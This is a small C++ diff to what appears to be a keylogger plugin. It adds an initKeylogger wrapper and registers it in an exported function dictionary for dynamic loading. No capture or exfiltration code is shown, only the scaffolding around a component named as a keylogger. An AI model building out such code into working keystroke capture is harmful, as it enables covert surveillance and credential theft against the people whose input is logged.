@@ -6,6 +6,11 @@ Keylogger*				instantiate()
 	return keylogger;
 }
 
+bool					initKeylogger(Keylogger* keylogger)
+{
+	return keylogger->init();
+}
+
 extern "C" {
 #ifdef __linux__
 	Dictionary	getDictionary(void)
@@ -17,6 +22,7 @@ extern "C" {
 
 		// List every usefull functions out there
 		(*dict)["instantiate"] = (void *)&instantiate;
+		(*dict)["initKeylogger"] = (void*)&initKeylogger;
 
 		return (dict);
 	}
